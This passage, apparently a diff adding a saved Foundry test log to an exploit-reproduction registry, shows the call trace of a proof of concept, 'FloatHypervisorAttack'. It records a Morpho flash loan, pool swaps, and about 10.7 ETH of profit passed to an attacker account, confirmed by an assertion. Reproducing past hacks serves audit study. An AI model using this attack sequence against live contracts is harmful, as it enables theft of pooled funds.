+    │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 15957406818065944972089 [1.595e22]
+    │   │   │   │   │   │   │   └─ ← [Return] 15957406818065944972089 [1.595e22]
+    │   │   │   │   │   │   ├─ [5993] FloatHypervisorAttack::uniswapV3SwapCallback(233291415527642537482223 [2.332e23], -238071077231653286968 [-2.38e20], 0x)
+    │   │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], 233291415527642537482223 [2.332e23])
+    │   │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], 233291415527642537482223 [2.332e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], amount: 233291415527642537482223 [2.332e23])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xb65a6fcba7239a6c772fa71308ae3f27965827fb0aa7332845b0a66e1591e5d0: 0x0000000000000000000000000000000000000000000003610d817b10f1108b39 → 0x0000000000000000000000000000000000000000000034c7ce4492904f29e328
+    │   │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x000000000000000000000000000000000000000000003a0218ce338384ce89ec → 0x00000000000000000000000000000000000000000000089b580b1c0426b531fd
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 249248822345708482454312 [2.492e23]
+    │   │   │   │   │   │   │   └─ ← [Return] 249248822345708482454312 [2.492e23]
+    │   │   │   │   │   │   ├─ emit Swap(sender: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount0: 233291415527642537482223 [2.332e23], amount1: -238071077231653286968 [-2.38e20], sqrtPriceX96: 1291467994120676505669234512 [1.291e27], liquidity: 1133407984537154375147 [1.133e21], tick: -82336 [-8.233e4])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 1: 0x00000000000000000000000000000001acdc1ba0f82ff253bdb24e7ee51934cf → 0x00000000000000000000000000000001cf01a541f66fc945935eb24e7a553422
+    │   │   │   │   │   │   │   @ 0xed11548b4f9ab28a0cfdd94c0786cf77fb76a7c25e7d733b3760efbb4349deb2: 0x016457ac7d00000000000000000053c3bd69fa46ae0d617424fffb7a0f327b9a → 0x01063d9e460000000000000000001bde5e85cd898bc0c37e74fff8c8efd1331d
+    │   │   │   │   │   │   │   @ 0xfee3245e2c1c9b7760f82f3ca09b133e8493299737d551b7edab3caca06d23b3: 0x016871cc5b0000000000000000006e8273d137a1a275a6e8d2fff6bb7dee712b → 0x0102237e68000000000000000000011fa81e902e97587e09c6fffd8781153d8c
+    │   │   │   │   │   │   │   @ 0x401d552da1477f668c4f3446d4dc6f410fa6330ddf2a63b199e7792003dac92c: 0x00000000000000000000000000000001acdc1ba0f82ff253bdb24e7ee51934cf → 0x000000000000000000000000000000000b73b0b72e6330ff115526038b3fd037
+    │   │   │   │   │   │   │   @ 0xc06a0b06e22e21c202c6bebfc53a8c25d6f75320148af12fb76fab4475ee89ad: 0x000000000000000000000000000000004f64c15da62f95d49b2103804a51458c → 0x000000000000000000000000000000017ea65edffcb498dcbb576fb2ad3d873d
+    │   │   │   │   │   │   │   @ 0xfee3245e2c1c9b7760f82f3ca09b133e8493299737d551b7edab3caca06d23b2: 0x000000000000000000000000000000000026a87f205b358ba874621a9e227797 → 0x000000000000000000000000000000000020658ff95874ac588457323cc7609e
+    │   │   │   │   │   │   │   @ 0xe10f5ddc36b528508d2db6488cd7ecf9a5d1df5a09e298fd321bcdadcd4bae32: 0x01661b71790000000000000000006d5013d815995f9781c946fff96e6fb9fc22 → 0x010479d94a00000000000000000002520817b236da36a32952fffad48f49b295
+    │   │   │   │   │   │   │   @ 3: 0x000000000000000001bc16d674ec7ffd000000000000000833f485b7b2e9f959 → 0x000000000000000001bc16d674ec7ffd000000000000000e86bd52e9cf814859
+    │   │   │   │   │   │   │   @ 0xe10f5ddc36b528508d2db6488cd7ecf9a5d1df5a09e298fd321bcdadcd4bae30: 0x000000000000000000000000000000010304ecba56a32f8c8dccdf7d80680f74 → 0x00000000000000000000000000000000c5df48f44f1d6a0fd1c6db5ebabe3d4c
+    │   │   │   │   │   │   │   @ 0xed11548b4f9ab28a0cfdd94c0786cf77fb76a7c25e7d733b3760efbb4349deb0: 0x000000000000000000000000000000007f846f7ddf9ba323064e24d81bee6134 → 0x000000000000000000000000000000014b8982fb899a9d37a109fc1ec2ccc7a8
+    │   │   │   │   │   │   │   @ 0xfee3245e2c1c9b7760f82f3ca09b133e8493299737d551b7edab3caca06d23b1: 0x000000000000000000000000000000013b3439c94168462fee9fbfa87c2f2ca6 → 0x000000000000000000000000000000008aea717ca346dbdc548424286a0b8454
+    │   │   │   │   │   │   │   @ 0x401d552da1477f668c4f3446d4dc6f410fa6330ddf2a63b199e7792003dac92e: 0x016a954ac30000000000000000006fa21befc7d039ce24f298fff442ff03aeb7 → 0x0100000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   @ 0xf730f8ec40d52d43793ecf9f61048727f9b52c5975088dea11f80e8e29c36453: 0x000000000000000000000000000000000021eb86c62aee54cd1bc3fb8da64f65 → 0x00000000000000000000000000000000002522885388bbe333dcf5514d4388d0
+    │   │   │   │   │   │   │   @ 0xf730f8ec40d52d43793ecf9f61048727f9b52c5975088dea11f80e8e29c36454: 0x0169481ae40000000000000000006eebf0728b9d17ef8f223ffff5b12cc3b076 → 0x01014d2fdf00000000000000000000b62b7d3c3321de95d059fffe91d23ffe41
+    │   │   │   │   │   │   │   @ 0x87e69dba913e8be313bce33a9b6d74289e6b961e17da64489f5189610ee4c556: 0x016a954ac30000000000000000006fa21befc7d039ce24f298fff442ff03aeb7 → 0x0100000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   @ 0xf730f8ec40d52d43793ecf9f61048727f9b52c5975088dea11f80e8e29c36452: 0x0000000000000000000000000000000146f4c29d94fde782b41b6986c134e139 → 0x000000000000000000000000000000007a5ef6d4767726c83a57de9cef615985
+    │   │   │   │   │   │   │   @ 0x87e69dba913e8be313bce33a9b6d74289e6b961e17da64489f5189610ee4c555: 0x000000000000000000000000000000000038b65d95626a8b5846d6ae98c2cc4d → 0x00000000000000000000000000000000000e57b184513faca8b1e29e42270be8
+    │   │   │   │   │   │   │   @ 0x401d552da1477f668c4f3446d4dc6f410fa6330ddf2a63b199e7792003dac92d: 0x00000000000000000000000000000000003938c1d9ce45afe573f1cd3a422255 → 0x00000000000000000000000000000000000dd54d3fe564881b84c77fa0a7b5e0
+    │   │   │   │   │   │   │   @ 0xc06a0b06e22e21c202c6bebfc53a8c25d6f75320148af12fb76fab4475ee89ae: 0x000000000000000000000000000000000002db503f6a7c28d82cb5b7487aeefc → 0x00000000000000000000000000000000004432beda492e0f28cc0395926ee939
+    │   │   │   │   │   │   │   @ 0x87e69dba913e8be313bce33a9b6d74289e6b961e17da64489f5189610ee4c554: 0x00000000000000000000000000000001acdc1ba0f82ff253bdb24e7ee51934cf → 0x000000000000000000000000000000000ce9fb6182bd341f4b1b0f20084d0f5a
+    │   │   │   │   │   │   │   @ 0xed11548b4f9ab28a0cfdd94c0786cf77fb76a7c25e7d733b3760efbb4349deb1: 0x0000000000000000000000000000000000076044cf0e7add3d89f07348082fd4 → 0x00000000000000000000000000000000003fadca4aa52f5ac36ec8d992e1a861
+    │   │   │   │   │   │   │   @ 4: 0x00000000000000000000000000000000000000000000003d7131c0587661c009 → 0x00000000000000000000000000000000000000000000003d71320ce238844deb
+    │   │   │   │   │   │   │   @ 0: 0x000166004c004c004bff5c0d00000000000000001f65f41a638f2d9a8f8387da → 0x000166004c004c004bfebe600000000000000000042c46fc3efd9284784e6f50
+    │   │   │   │   │   │   │   @ 0xe10f5ddc36b528508d2db6488cd7ecf9a5d1df5a09e298fd321bcdadcd4bae31: 0x0000000000000000000000000000000000201417e487326579a5e4cdeba23090 → 0x000000000000000000000000000000000026f9f7352c77d28752d47eef47a7a5
+    │   │   │   │   │   │   │   @ 0xc06a0b06e22e21c202c6bebfc53a8c25d6f75320148af12fb76fab4475ee89af: 0x016266816e00000000000000000004ef57370e96a84085b2e8fffdcfbeb03450 → 0x01082ec9550000000000000000006ab2c4b8b939918d9f3fb0fff67340537a67
+    │   │   │   │   │   │   └─ ← [Return] 233291415527642537482223 [2.332e23], -238071077231653286968 [-2.38e20]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9]) [staticcall]
+    │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 135410041506077343717833 [1.354e23]
+    │   │   │   │   │   └─ ← [Return] 135410041506077343717833 [1.354e23]
+    │   │   │   │   ├─ [2534] WETH9::balanceOf(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 35871525132937218379 [3.587e19]
+    │   │   │   │   ├─ emit Sync(reserve0: 135410041506077343717833 [1.354e23], reserve1: 35871525132937218379 [3.587e19])
+    │   │   │   │   ├─ emit Swap(sender: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount0In: 120361083249749247743230 [1.203e23], amount1In: 0, amount0Out: 120000000000000000000000 [1.2e23], amount1Out: 0, to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x6a945b77000000000001f1d1420d8c38494b000000001c9904c94e15710e44cb → 0x6a954ac3000000000001f1d1420d8c38494b000000001cac97d2b4a1309f99c9
+    │   │   │   │   │   @ 10: 0x000000000000000000000000006067f6334dcef80eb57a8904cb0d202d503b7c → 0x000000000000000000000000006075b55b1d4f9d72fa0d66f1592c3617ac7f98
+    │   │   │   │   │   @ 9: 0x000000000000000000000000000000012af81954d08e4aa27a958dec39b75069 → 0x000000000000000000000000000000012b085ee97eb53526d56af5afda54ef89
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9], 40644521389686378541565 [4.064e22])
+    │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9], 40644521389686378541565 [4.064e22]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9], amount: 40644521389686378541565 [4.064e22])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x00000000000000000000000000000000000000000000089b580b1c0426b531fd → 0
+    │   │   │   │   │   │   @ 0xc4b948fd41cc175e8979527a52bcb5d267fafc45ba8ecd9a74764598f775554d: 0x000000000000000000000000000000000000000000001cac97d2b4a1309f99c9 → 0x000000000000000000000000000000000000000000002547efddd0a55754cbc6
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [20139] UniswapV2Pair::swap(0, 8262293544735057778 [8.262e18], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x)
+    │   │   │   │   ├─ [6062] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 8262293544735057778 [8.262e18])
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 8262293544735057778 [8.262e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x00000000000000000000000000000000000000000000003657b59165dd0382d4 → 0x000000000000000000000000000000000000000000000036ca5f2199f0f32a46
+    │   │   │   │   │   │   @ 0x78bb2a93f2d8e4de126019e44bc7497f9ea2d0189a69400a80063175556c58ff: 0x000000000000000000000000000000000000000000000001f1d1420d8c38494b → 0x0000000000000000000000000000000000000000000000017f27b1d97848a1d9
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9]) [staticcall]
+    │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 176054562895763722259398 [1.76e23]
+    │   │   │   │   │   └─ ← [Return] 176054562895763722259398 [1.76e23]
+    │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 27609231588202160601 [2.76e19]
+    │   │   │   │   ├─ emit Sync(reserve0: 176054562895763722259398 [1.76e23], reserve1: 27609231588202160601 [2.76e19])
+    │   │   │   │   ├─ emit Swap(sender: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount0In: 40644521389686378541565 [4.064e22], amount1In: 0, amount0Out: 0, amount1Out: 8262293544735057778 [8.262e18], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x6a954ac3000000000001f1d1420d8c38494b000000001cac97d2b4a1309f99c9 → 0x6a954ac30000000000017f27b1d97848a1d9000000002547efddd0a55754cbc6
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3425] WETH9::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], 1000000000000000000000 [1e21])
+    │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], amount: 1000000000000000000000 [1e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x000000000000000000000000000000000000000000000036ca5f2199f0f32a46 → 0x000000000000000000000000000000000000000000000000949573d412532a46
+    │   │   │   │   @ 0x9ddf8259b5dfabc9e47e107236a6121103d753bff80b7accad156017de069d9a: 0x0000000000000000000000000000000000000000000002539b4d45c411858874 → 0x000000000000000000000000000000000000000000000289d116f389f0258874
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return]
+    │   ├─ [534] WETH9::balanceOf(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab]) [staticcall]
+    │   │   └─ ← [Return] 10706591043820923462 [1.07e19]
+    │   ├─ [9195] WETH9::withdraw(10706591043820923462 [1.07e19])
+    │   │   ├─ [55] FloatHypervisorAttack::receive{value: 10706591043820923462}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Withdrawal(src: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], wad: 10706591043820923462 [1.07e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x000000000000000000000000000000000000000000000000949573d412532a46 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [0] AttackerEOA::fallback{value: 10706591043820923462}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "attacker ETH profit", val: 10706591043820923462 [1.07e19], decimals: 18)
+    ├─ [0] VM::assertApproxEqAbs(10706591043820923462 [1.07e19], 10706600000000000000 [1.07e19], 50000000000000000 [5e16], "profit off expected ~10.7066 ETH") [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit ETH Balance", val: 10706591043820923462 [1.07e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.30s (620.14ms CPU time)
+
+Ran 1 test suite in 12.90s (5.30s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/workspaces/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 21870 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /workspaces/RustroverProjects/audits/evm-hack-registry/2026-08-FloatProtocol_exp)
